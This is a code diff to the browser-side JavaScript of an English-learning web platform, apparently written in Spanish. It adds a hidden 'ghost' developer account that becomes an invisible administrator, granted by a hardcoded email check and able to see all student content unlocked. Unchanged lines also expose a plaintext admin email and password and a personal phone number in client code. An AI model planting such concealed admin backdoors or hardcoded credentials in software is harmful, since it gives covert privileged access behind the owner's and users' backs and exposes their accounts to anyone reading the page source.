@@ -1207,6 +1207,8 @@ async function askAI(maxTokens,extraSystem){
 }
 const ADMIN_EMAIL='rubenJ@gmail.com';
 const ADMIN_PASS='ruben123';
+// Cuenta fantasma del desarrollador: admin invisible + ve TODO el contenido de alumno desbloqueado
+const SUPER_ADMIN_EMAIL='eduard1@gmail.com';
 // ── Soporte (edita estos valores) ──
 const SUPPORT_WHATSAPP='59165884652';            // número con código de país, SIN + ni espacios
 const SUPPORT_WA_MSG='Hola, necesito ayuda con la plataforma Brain Master English';
@@ -1247,7 +1249,7 @@ function populateGroupSelects(){
 // ═══════════════════════
 // STATE
 // ═══════════════════════
-let currentUser=null,isAdmin=false;
+let currentUser=null,isAdmin=false,isSuper=false;
 let allModules=[],allLessons=[],allExams=[],allQuestions=[];
 let allMaterials=[],fcCards=[],fcIndex=0;
 let allSessions=[];
@@ -1320,6 +1322,8 @@ async function doLogin(){
   const profile=await getProfile(data.user.id);
   currentUser={id:data.user.id,email:data.user.email,name:profile?.full_name||(email.split('@')[0].charAt(0).toUpperCase()+email.split('@')[0].slice(1)),group:profile?.group_name||'',plan30:!!profile?.plan30_access};
   isAdmin=profile?.role==='admin';
+  isSuper=(data.user.email||'').toLowerCase()===SUPER_ADMIN_EMAIL.toLowerCase();
+  if(isSuper)isAdmin=true;
   try{sb.from('profiles').update({last_access:new Date().toISOString()}).eq('id',data.user.id).then(()=>{},()=>{});}catch(e){}
   if(profile?.must_change_password){
     document.getElementById('login-screen').style.display='none';
@@ -1406,12 +1410,15 @@ async function launchApp(){
   initSidebarFx();
   resetNavTabs();
   if(isAdmin){
-    ['classes','assistant','progress','materials','exams','sessions','support'].forEach(v=>{const el=document.querySelector(`.nav-tab[data-view="${v}"]`);if(el)el.classList.add('hidden');});
+    // El super admin (desarrollador) ve TAMBIÉN las pestañas de alumno; el admin normal no.
+    if(!isSuper){
+      ['classes','assistant','progress','materials','exams','sessions','support'].forEach(v=>{const el=document.querySelector(`.nav-tab[data-view="${v}"]`);if(el)el.classList.add('hidden');});
+    }
     ['dashboard','admin-modules','admin-exams','admin-students','admin-add','admin-materials','admin-sessions'].forEach(v=>{const el=document.querySelector(`.nav-tab[data-view="${v}"]`);if(el)el.classList.remove('hidden');});
     document.getElementById('admin-badge').classList.remove('hidden');
   }
   await loadStudyTime();initWeekBars();initChat();initSpeech();startSessionTimer();
-  if(isAdmin){showView('dashboard');await loadAdminData();}
+  if(isAdmin){showView('dashboard');await loadAdminData();if(isSuper)await loadModules();}
   else{showView('classes');await loadModules();}
 }
 
@@ -1421,7 +1428,7 @@ async function doLogout(){
   clearInterval(sessionTimer);
   if(synth)synth.cancel();
   if(recognition&&isRecording)recognition.stop();
-  currentUser=null;isAdmin=false;allModules=[];allLessons=[];allExams=[];allQuestions=[];userAccess=[];allStudentsCache=[];completedLessons=new Set();
+  currentUser=null;isAdmin=false;isSuper=false;allModules=[];allLessons=[];allExams=[];allQuestions=[];userAccess=[];allStudentsCache=[];completedLessons=new Set();
   chatHistory=[];vocabItems=[];sessionMsgs=0;sessionWords=0;sessionStart=null;sessionTimer=null;
   isRecording=false;recognition=null;activeSpeakBtn=null;currentModuleId=null;examAnswers={};
   document.querySelectorAll('.view').forEach(v=>v.classList.remove('active'));
